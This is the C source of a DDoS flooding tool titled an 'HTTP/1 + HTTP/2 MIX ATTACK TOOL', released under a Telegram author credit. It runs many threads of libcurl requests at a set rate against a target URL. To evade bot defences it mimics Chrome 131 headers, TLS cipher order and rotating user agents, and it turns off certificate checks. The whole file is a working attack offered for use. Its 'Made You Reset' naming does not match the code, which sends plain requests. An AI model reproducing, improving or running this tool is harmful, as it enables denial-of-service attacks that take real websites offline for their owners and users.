/*
 * ================================================================
 * XCDDOS H2RC HTTP/1 + HTTP/2 MIX ATTACK TOOL (Improved)
 * Compiled: gcc -o H2RC H2RC.c -lcurl -lpthread -lm
 * Usage: ./H2RC --url https://xcddos.xyz --rps 1000 --workers 100 --duration 120
 * ================================================================
 */

 /*
HTTP1+HTTP2 Made You Reset (H2RC) Script License
Copyright (c) 2026 t.me/xxiinn

Permission is hereby granted to any person obtaining a copy of this script and associated files (the "Software"), to use the Software for personal and educational purposes only, subject to the following conditions:

1. The original author credit (t.me/xxiinn) must not be removed or modified.
2. Redistribution of this script is allowed only if the original credit remains intact.
3. Selling, relicensing, or claiming this script as your own work is strictly prohibited.
4. Any modification of this script must clearly state that it is a modified version and still include the original author's credit.
5. The author is not responsible for any misuse, damage, or illegal activity caused by this script.
6. It is prohibited to distribute this script for free, in any way, to anyone who is not wanted by the owner t.me/xxiinn. If you violate this, you are considered to have violated this license.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.

By using this software, you agree to all the terms listed above.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <math.h>
#include <curl/curl.h>
#include <getopt.h>
#include <signal.h>

static volatile int running = 1;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
static long long total_requests = 0;
static long long total_errors = 0;
static double *latencies = NULL;
static size_t latencies_count = 0;
static size_t latencies_capacity = 0;

static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    return size * nmemb;
}

typedef struct {
    int worker_id;
    char *url;
    double interval;
    int duration;
    long long *counter;
    long long *error_counter;
    pthread_mutex_t *mutex;
} worker_args;

static void atomic_add(pthread_mutex_t *mutex, long long *var, long long val) {
    pthread_mutex_lock(mutex);
    *var += val;
    pthread_mutex_unlock(mutex);
}

static void record_latency(double latency_ms) {
    pthread_mutex_lock(&stats_mutex);
    if (latencies_count >= latencies_capacity) {
        size_t new_cap = latencies_capacity == 0 ? 1024 : latencies_capacity * 2;
        double *new_arr = realloc(latencies, new_cap * sizeof(double));
        if (new_arr) {
            latencies = new_arr;
            latencies_capacity = new_cap;
        }
    }
    if (latencies) {
        latencies[latencies_count++] = latency_ms;
    }
    pthread_mutex_unlock(&stats_mutex);
}

static int compare_double(const void *a, const void *b) {
    double da = *(const double *)a;
    double db = *(const double *)b;
    if (da < db) return -1;
    if (da > db) return 1;
    return 0;
}

// ===== User-Agent rotation list (Chrome 131 â€” from tls.go) =====
static const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
};
static int num_uas = sizeof(user_agents) / sizeof(user_agents[0]);

static void *worker_thread(void *arg) {
    worker_args *wa = (worker_args *)arg;
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Worker %d: curl_easy_init failed\n", wa->worker_id);
        return NULL;
    }

    struct curl_slist *headers = NULL;
    // We'll add User-Agent later per request; keep common headers.
    // Chrome 131 header set â€” from tls.go (ChromeHeaders + hpack template)
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    headers = curl_slist_append(headers, "Cache-Control: max-age=0");
    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
    headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
    headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
    headers = curl_slist_append(headers, "Sec-Fetch-User: ?1");
    headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
    headers = curl_slist_append(headers, "Sec-Ch-Ua: \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \";Not A Brand\";v=\"24\"");
    headers = curl_slist_append(headers, "Sec-Ch-Ua-Mobile: ?0");
    headers = curl_slist_append(headers, "Sec-Ch-Ua-Platform: \"Windows\"");

    curl_easy_setopt(curl, CURLOPT_URL, wa->url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 3L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    // JA3: Chrome 131 cipher order (from tls.go profiles.Chrome_131)
    curl_easy_setopt(curl, CURLOPT_SSL_CIPHER_LIST,
        "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
        "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
        "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
        "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
        "ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:"
        "ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:"
        "AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA");
    // H2 settings target (Chrome 131, from tls.go HTTP2SettingsFrame):
    //   HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0, INITIAL_WINDOW_SIZE=6291456,
    //   MAX_HEADER_LIST_SIZE=262144, WINDOW_UPDATE=15663105
    // (libcurl/nghttp2 controls the actual SETTINGS frame internally)
    curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
    curl_easy_setopt(curl, CURLOPT_TCP_KEEPIDLE, 10L);
    curl_easy_setopt(curl, CURLOPT_TCP_KEEPINTVL, 5L);
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);

    double next_send = 0.0;
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    double start_time = ts.tv_sec + ts.tv_nsec * 1e-9;
    double end_time = start_time + wa->duration;
    next_send = start_time;

    // Seed random per thread (use time + worker id)
    srand(time(NULL) + wa->worker_id);

    while (running) {
        clock_gettime(CLOCK_MONOTONIC, &ts);
        double now = ts.tv_sec + ts.tv_nsec * 1e-9;
        if (now >= end_time) break;

        if (now < next_send) {
            struct timespec sleep_ts;
            double diff = next_send - now;
            sleep_ts.tv_sec = (time_t)diff;
            sleep_ts.tv_nsec = (long)((diff - sleep_ts.tv_sec) * 1e9);
            nanosleep(&sleep_ts, NULL);
            continue;
        }

        // Randomize User-Agent
        int idx = rand() % num_uas;
        curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents[idx]);

        double req_start = now;
        CURLcode res = curl_easy_perform(curl);
        double req_end;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        req_end = ts.tv_sec + ts.tv_nsec * 1e-9;

        double latency_ms = (req_end - req_start) * 1000.0;

        if (res == CURLE_OK) {
            atomic_add(wa->mutex, wa->counter, 1);
            record_latency(latency_ms);
        } else {
            atomic_add(wa->mutex, wa->error_counter, 1);
        }

        // Add jitter to interval (random delay up to 200ms)
        double jitter = ((double)rand() / RAND_MAX) * 0.2; // 0â€“0.2 sec
        next_send += wa->interval + jitter;
        // If too far behind, reset
        if (next_send < now - wa->interval * 2) {
            next_send = now + wa->interval;
        }
    }

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    return NULL;
}

static void *monitor_thread(void *arg) {
    long long *counter = (long long *)arg;
    long long last_count = 0;
    double last_time;
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    last_time = ts.tv_sec + ts.tv_nsec * 1e-9;

    while (running) {
        sleep(2);
        clock_gettime(CLOCK_MONOTONIC, &ts);
        double now = ts.tv_sec + ts.tv_nsec * 1e-9;
        long long current_count;
        pthread_mutex_lock(&stats_mutex);
        current_count = total_requests;
        pthread_mutex_unlock(&stats_mutex);

        double elapsed = now - last_time;
        if (elapsed > 0) {
            double current_rps = (current_count - last_count) / elapsed;
            long long errors;
            pthread_mutex_lock(&stats_mutex);
            errors = total_errors;
            pthread_mutex_unlock(&stats_mutex);
            printf("[MONITOR] %lld req | RPS: %.1f | Errors: %lld\n",
                   current_count, current_rps, errors);
        }
        last_count = current_count;
        last_time = now;
    }
    return NULL;
}

static void signal_handler(int sig) {
    (void)sig;
    running = 0;
}

int main(int argc, char **argv) {
    static struct option long_options[] = {
        {"url", required_argument, 0, 'u'},
        {"rps", required_argument, 0, 'r'},
        {"workers", required_argument, 0, 'w'},
        {"duration", required_argument, 0, 'd'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };

    char *url = NULL;
    int rps = 0;
    int workers = 100;
    int duration = 30;

    int opt;
    int option_index = 0;
    while ((opt = getopt_long(argc, argv, "u:r:w:d:h", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'u': url = strdup(optarg); break;
            case 'r': rps = atoi(optarg); break;
            case 'w': workers = atoi(optarg); break;
            case 'd': duration = atoi(optarg); break;
            case 'h':
            default:
                printf("XCDDOS H2RC HTTP/1+2 MIX - Usage:\n");
                printf("  --url <target>      Target URL (HTTPS only)\n");
                printf("  --rps <num>         Requests per second target\n");
                printf("  --workers <num>     Number of worker threads (default 100)\n");
                printf("  --duration <sec>    Test duration (default 30)\n");
                printf("Usage: ./H2RC --url https://xcddos.xyz --rps 1000 --workers 100 --duration 120\n\n");
                printf("Dibuat oleh: t.me/xxiinn || Rilis: 02-Agustus-2026 \n");
                return 0;
        }
    }

    if (!url || rps <= 0) {
        fprintf(stderr, "Error: --url and --rps are required.\n\n");
        fprintf(stderr, "Type ./H2RC -h.\n");
        fprintf(stderr, "Untuk melihat menu!.\n");
        return 1;
    }

    if (strncmp(url, "https://", 8) != 0) {
        fprintf(stderr, "Error: Only HTTPS URLs are supported.\n");
        return 1;
    }

    srand(time(NULL)); // seed for main

    printf("XCDDOS H2RC HTTP/1+2 MIX ATTACK || t.me/xxiinn\n");
    printf("Target: %s\n", url);
    printf("RPS: %d\n", rps);
    printf("Workers: %d\n", workers);
    printf("Duration: %d seconds\n", duration);

    curl_global_init(CURL_GLOBAL_ALL);

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    pthread_t *threads = malloc(workers * sizeof(pthread_t));
    worker_args *args = malloc(workers * sizeof(worker_args));
    if (!threads || !args) {
        perror("malloc");
        return 1;
    }

    double per_worker_rps = (double)rps / workers;
    double interval = per_worker_rps > 0 ? 1.0 / per_worker_rps : 0.0;

    for (int i = 0; i < workers; i++) {
        args[i].worker_id = i;
        args[i].url = url;
        args[i].interval = interval;
        args[i].duration = duration;
        args[i].counter = &total_requests;
        args[i].error_counter = &total_errors;
        args[i].mutex = &stats_mutex;
        if (pthread_create(&threads[i], NULL, worker_thread, &args[i]) != 0) {
            perror("pthread_create");
            return 1;
        }
    }

    pthread_t monitor_tid;
    pthread_create(&monitor_tid, NULL, monitor_thread, NULL);

    for (int i = 0; i < workers; i++) {
        pthread_join(threads[i], NULL);
    }

    running = 0;
    pthread_join(monitor_tid, NULL);

    printf("\n==============================\n");
    printf("XCDDOS H2RC HTTP/1+2 MIX COMPLETE\n");
    printf("==============================\n");
    double total_time = duration;
    double avg_rps = (double)total_requests / total_time;
    printf("Total requests: %lld\n", total_requests);
    printf("Average RPS:    %.2f\n", avg_rps);
    printf("Target RPS:     %d\n", rps);
    printf("Effectiveness:  %.1f%%\n", (avg_rps / rps) * 100.0);
    printf("Total errors:   %lld\n", total_errors);

    if (latencies_count > 0) {
        double min = latencies[0], max = latencies[0], sum = 0;
        for (size_t i = 0; i < latencies_count; i++) {
            if (latencies[i] < min) min = latencies[i];
            if (latencies[i] > max) max = latencies[i];
            sum += latencies[i];
        }
        double avg = sum / latencies_count;
        qsort(latencies, latencies_count, sizeof(double), compare_double);
        double p95 = latencies[(size_t)(latencies_count * 0.95)];
        printf("Latency (ms): Min=%.1f, Avg=%.1f, Max=%.1f, P95=%.1f\n", min, avg, max, p95);
    }

    curl_global_cleanup();
    free(threads);
    free(args);
    free(url);
    free(latencies);

    return 0;
}
